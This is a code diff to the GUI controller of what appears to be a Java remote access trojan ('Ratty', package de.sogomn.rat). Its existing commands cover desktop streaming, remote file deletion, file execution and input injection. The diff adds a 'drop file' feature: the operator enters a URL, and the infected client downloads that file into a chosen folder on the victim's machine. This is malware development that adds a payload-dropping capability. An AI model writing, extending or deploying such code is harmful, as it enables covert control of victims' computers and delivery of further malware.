@@ -20,6 +20,7 @@ import de.sogomn.rat.packet.CreateDirectoryPacket;
 import de.sogomn.rat.packet.DeleteFilePacket;
 import de.sogomn.rat.packet.DesktopPacket;
 import de.sogomn.rat.packet.DownloadFilePacket;
+import de.sogomn.rat.packet.DownloadUrlPacket;
 import de.sogomn.rat.packet.ExecuteFilePacket;
 import de.sogomn.rat.packet.FileRequestPacket;
 import de.sogomn.rat.packet.FreePacket;
@@ -73,6 +74,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private static final String BUILDER_ADDRESS_QUESTION = LANGUAGE.getString("builder.address_question");
 	private static final String BUILDER_PORT_QUESTION = LANGUAGE.getString("builder.port_question");
 	private static final String UPLOAD_EXECUTE_WARNING = LANGUAGE.getString("server.upload_execute_warning");
+	private static final String URL_MESSAGE = LANGUAGE.getString("server.url_message");
 	
 	private static final Sound PING = Sound.loadSound("/ping.wav");
 	
@@ -114,7 +116,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private WebsitePacket createWebsitePacket() {
-		final String input = gui.getInput();
+		final String input = gui.getInput(URL_MESSAGE);
 		
 		if (input != null) {
 			final WebsitePacket packet = new WebsitePacket(input);
@@ -287,6 +289,20 @@ public final class RattyGuiController extends AbstractRattyController implements
 		client.connection.addPacket(execute);
 	}
 	
+	private DownloadUrlPacket createDownloadUrlPacket(final ServerClient client) {
+		final String address = gui.getInput(URL_MESSAGE);
+		
+		if (address != null) {
+			final FileTreeNode node = client.fileTree.getLastNodeClicked();
+			final String path = node.getPath();
+			final DownloadUrlPacket packet = new DownloadUrlPacket(address, path);
+			
+			return packet;
+		}
+		
+		return null;
+	}
+	
 	private void handleCommand(final ServerClient client, final String command) {
 		if (command == RattyGui.FILES) {
 			client.fileTree.setVisible(true);
@@ -336,6 +352,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 			packet = createDeletePacket(client);
 		} else if (command == FileTree.NEW_DIRECTORY) {
 			packet = createFolderPacket(client);
+		} else if (command == FileTree.DROP_FILE) {
+			packet = createDownloadUrlPacket(client);
 		} else if (command == DisplayPanel.MOUSE_EVENT && client.isStreamingDesktop()) {
 			packet = client.displayPanel.getLastMouseEventPacket();
 		} else if (command == DisplayPanel.KEY_EVENT && client.isStreamingDesktop()) {
